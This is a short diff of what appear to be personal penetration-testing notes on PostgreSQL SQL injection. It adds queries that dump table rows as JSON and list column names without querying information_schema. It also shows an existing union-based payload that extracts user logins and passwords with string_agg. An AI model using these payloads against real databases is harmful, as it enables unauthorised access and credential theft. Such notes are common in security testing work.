@@ -1,6 +1,10 @@
 # postgres
 
 # sqli
+* get column names and values
+select to_jsonb(u.*) from users u;
+select jsonb_object_keys(((select to_jsonb(u.*) from users u limit 1))); // without touching information_schema
+
 * fast exploitation in PosgreSQL >= 9.0 using string_agg function
 id=-1 union select null,string_agg(login||chr(58)||pass,chr(44)) from users;
 id |              news
